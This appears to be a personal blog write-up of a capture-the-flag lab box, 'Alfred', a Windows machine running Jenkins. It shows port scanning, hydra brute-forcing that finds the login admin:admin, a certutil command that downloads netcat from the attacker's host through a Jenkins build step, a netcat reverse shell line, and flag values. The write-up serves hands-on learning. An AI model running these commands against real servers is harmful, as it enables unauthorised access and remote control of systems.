---
title: "Hack Smarter - Easy - Ascension"
date: 2025-11-02 12:00:00 -0700
categories: [CTF,Hack Smarter]
tags: [windows, webapp]
---

![Alfred](/assets/img/ctf/thm/easy/alfred/alfred.png)

# Initial Intel
* Difficulty: Easy
* OS: Windows

# tl;dr
<details><summary>Spoilers</summary>
* Bruteforce the webapp on :8080<br/>
* Once logged in, walk each page/tab of the app for interesting features. There is something that can be used to interact with the OS directly<br/>
* Get netcat to the $target and get a revshell<br/>
* The user context of the revshell has enough privileges for user.txt and root.txt<br/>
</details>

# Attack Path

## Recon

### Service Enumeration

Let's start off with a basic TCP scan. If we can't find anything we can later run a UDP scan.

```bash
# set host & initiate a standard tcp scan
┌──(haunter㉿kali)-[~/working/offsec/easy/FunBoxEasyEnum]
└─$ sudo nmap -A -p- -vvv -T3 --open -oN nmap_tcp_full $alfred
```

Host appears unreachable, I added the -Pn flag in case ICMP is being dropped:

```bash
┌──(haunter㉿kali)-[~/working/thm/easy/alfred]
└─$ sudo nmap -A -p- -vvv -T3 --open -oN nmap_tcp_full -Pn $alfred 

80/tcp   open  http               syn-ack ttl 125 Microsoft IIS httpd 7.5                                   
3389/tcp open  ssl/ms-wbt-server? syn-ack ttl 125                                                           rdp-ntlm-info:                                      
|   Target_Name: ALFRED                               
|   NetBIOS_Domain_Name: ALFRED
|   NetBIOS_Computer_Name: ALFRED
|   DNS_Domain_Name: alfred
|   DNS_Computer_Name: alfred
8080/tcp open  http               syn-ack ttl 125 Jetty 9.4.z-SNAPSHOT
| http-robots.txt: 1 disallowed entry                                                 
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
```

There we go, we have three ports open: 2 webservers on :80 and :8080, and RDP on :3389.

I started with walking the two webapps.

### Webserver on TCP/80

![Landing page on port 80](/assets/img/ctf/thm/easy/alfred/1.png)

The site appears to be a single page with no interactive features. I checked the page source and found nothing of value. Additionally, I performed directory and file discovery with *feroxbuster* but found no other pages or directories on this port.

The page does potentially show two users, *bruce* and *alfred*. I recorded these in *users.txt* for potential use later.

```bash
┌──(haunter㉿kali)-[~/working/thm/easy/Alfred]
└─$ cat users.txt 
alfred
bruce
```

### Webserver on TCP/8080

I then moved to walk the other webserver on :8080

![Landing page for webserver on port 8080](/assets/img/ctf/thm/easy/alfred/2.png)

I tried to login using the potential usernames from earlier using combos as *bruce:bruce* and *alfred:bruce* as Jenkins documentation states that the default password is either created on setup or randomized. Bruteforcing may be an option if I can't find a path forward after further enum.

I tried to do some discovery:

```bash
┌──(haunter㉿kali)-[~/working/thm/easy/Alfred]                                                              └─$ feroxbuster --url http://$alfred:8080 --depth 2 --wordlist /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt -C 404 -x php,sh,txt,cgi,html,js,css,py,zip,aspx,pdf,docx,doc,md,log,htm,asp,do
 ___  ___  __   __     __      __         __   ___                                                          
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__                                                           
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___                                                          
by Ben "epi" Risher 🤓                 ver: 2.10.4                                                          
───────────────────────────┬──────────────────────                                                          
 🎯  Target Url            │ http://10.201.11.17:8080                                                       
 🚀  Threads               │ 50                                                                             
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt      
 💢  Status Code Filters   │ [404]                                                                          
 💥  Timeout (secs)        │ 7                                                                              
 🦡  User-Agent            │ feroxbuster/2.10.4                                                             
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml                                             
 🔎  Extract Links         │ true                                                                           
 💲  Extensions            │ [php, sh, txt, cgi, html, js, css, py, zip, aspx, pdf, docx, doc, md, log, htm, asp, do]
...
200      GET        3l       13w       71c http://10.201.11.17:8080/robots.txt
```

![Port 8080 robots.txt](/assets/img/ctf/thm/easy/alfred/3.png)

Found *robots.txt* which unfortunately didn't have any intel of value.

Since nothing else popped up with *feroxbuster*, I went back to the webserver stack to see if I could find anyhing exploitable. I used *Wappalyzer* and *whatweb*:

```bash
┌──(haunter㉿kali)-[~/working/thm/easy/Alfred]
└─$ whatweb http://$alfred:8080
http://10.201.11.17:8080 [403 Forbidden] Cookies[JSESSIONID.ee8d63dc], Country[RESERVED][ZZ], HTTPServer[Jetty(9.4.z-SNAPSHOT)], HttpOnly[JSESSIONID.ee8d63dc], IP[10.201.11.17], Jenkins[2.190.1], Jetty[9.4.z-SNAPSHOT], Meta-Refresh-Redirect[/login?from=%2F], Script, UncommonHeaders[x-content-type-options,x-hudson,x-jenkins,x-jenkins-session,x-you-are-authenticated-as,x-you-are-in-group-disabled,x-required-permission,x-permission-implied-by]
http://10.201.11.17:8080/login?from=%2F [200 OK] Cookies[JSESSIONID.ee8d63dc], Country[RESERVED][ZZ], HTML5, HTTPServer[Jetty(9.4.z-SNAPSHOT)], HttpOnly[JSESSIONID.ee8d63dc], IP[10.201.11.17], Jenkins[2.190.1], Jetty[9.4.z-SNAPSHOT], PasswordField[j_password], Script[text/javascript], Title[Sign in [Jenkins]], UncommonHeaders[x-content-type-options,x-hudson,x-jenkins,x-jenkins-session,x-instance-identity], X-Frame-Options[sameorigin]
```

![Webserver software versions](/assets/img/ctf/thm/easy/alfred/4.png)

There are two web technologies that stand out:
* Jenkins[2.190.1]
* Jetty[9.4.z-SNAPSHOT]

*Jetty* had a potential exploit. I didn't see anything for *Jenkins* from an inital seachsploit query.

```bash
┌──(haunter㉿kali)-[~/working/thm/easy/Alfred]                  
└─$ searchsploit jetty 9
-------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                            |  Path                          
-------------------------------------------------------------------------- ---------------------------------
...
Jetty 9.4.37.v20210219 - Information Disclosure                           | java/webapps/50438.txt
```

Fruitless. Had to try to bruteforce after all...

Earlier I mentioned that Jenkins has a default *admin* account, but the password needs to be set at setup or is set to a random value. I tried brute forcing with the *alfred* and *bruce* usernames, but I did not get a hit. I then tried the *admin* user.

When bruteforcing, this is my methodology:

* known usernames with known passwords list (e.g. user 'alfred' and 'discovered_passwords.txt')
* username:username
* popular default passwords (e.g. 'password', 'password123', '123456', etc)
* /usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt
* /usr/share/wordlists/rockyou.

I run the 10-million-password-list-top-10000.txt if needed first as it's a smaller list compared to rockyou. Once that's been exhaused, I then run rockyou.txt.

```bash
┌──(haunter㉿kali)-[~/working/thm/easy/Alfred]
└─$ hydra -f -s 8080 -l admin -P /usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt $alfred http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=&Submit=Sign+in:Invalid username or password" -t 15 
...
[8080][http-post-form] host: 10.201.31.54   login: admin   password: admin
```

We got a password "admin:admin". I want to slap myself >:(


![Jenkins Dashboard](/assets/img/ctf/thm/easy/alfred/5.png)

In any case I got into the Jenkins Dashboard. Just like when first assessing a webapp prior to logging into it, I'll walk the app first to enumerate any interesting features now that we have access. 

Diving into *Build History* reveals something interesting:

![Build history](/assets/img/ctf/thm/easy/alfred/6.png)

I investigated the project listed.

Command console icon == webshell potentially? Worth exploration. 

![Configuration](/assets/img/ctf/thm/easy/alfred/7.png)

Walked this project tab by tab.

Jackpot. Configure has a 'Windows batch command' section under *Build*. It looks like we can issue commands directly to the OS.


## Foothold

### Revshell

I'll try to get *netcat* over and get a revshell.

```powershell
certutil -f -urlcache http://10.21.42.166:8000/win/nc64.exe .\nc.exe
```

![Windows batch command](/assets/img/ctf/thm/easy/alfred/8.png)

![build](/assets/img/ctf/thm/easy/alfred/9.png)

Selecting *build* should trigger the command...now let's watch our httpserver log:

![httpserver log](/assets/img/ctf/thm/easy/alfred/10.png)

The command executed and was able to retrieve netcat. Now I'll setup a local listener and execute netcat from the $target to get a revshell.

```powershell
nc.exe 10.21.42.4444 -e cmd
```

![Executing netcat](/assets/img/ctf/thm/easy/alfred/11.png)

And now we check our listener. I'm using *penelope* here for my lister on :4444

![Penelope local listener](/assets/img/ctf/thm/easy/alfred/13.png)

We got a foothold as user *bruce*.

```powershell
c:\Users\bruce>type Desktop\user.txt
type Desktop\user.txt
79007a09481963edf2e1321abd9ae2a0
```
Got the user.txt flag.

## Lateral Movement / Privilege Escalation

Time for some initial enumeration to privesc.

User groups:

```powershell
whoami /groups
```

![User groups](/assets/img/ctf/thm/easy/alfred/14.png)

*BUILTIN\Administrators* - well, that makes things easy. We can probably get root.txt right away.

```powershell
C:\Program Files (x86)\Jenkins\workspace\project>for /r C:\ %f in (root.txt) do @if exist "%f" (echo %f & goto :found)
:found
for /r C:\ %f in (root.txt) do @if exist "%f" (echo %f & goto :found)
C:\Windows\System32\config\root.txt

C:\Program Files (x86)\Jenkins\workspace\project>:found
C:\Program Files (x86)\Jenkins\workspace\project>type C:\Windows\System32\config\root.txt
type C:\Windows\System32\config\root.txt
dff0f748678f280250f25a45b8046b4a
```
Yep, there we go. 

```powershell
for /r C:\ %f in (root.txt) do @if exist "%f" (echo %f & goto :found)
```
BTW, this command is great for enumerating. It will search for a specific file, print the path, then stop if it finds it.


## Root / SYSTEM

Since *bruce* was in the admins group I didn't bother getting SYSTEM on this system. However, there is a path forward if you choose to do so.

![Enabled User Tokens](/assets/img/ctf/thm/easy/alfred/15.png)

I had enumerated user privs and Impersonate is enabled. This can easily be exploited to escalate with tools such as PrintSpoofer or one of the many potatos. 

# Lessons Learned

* Bruteforcing logins can require different lists. Setup a methodolgy/checklist.
* Walking an app after access can reveal exploitable features
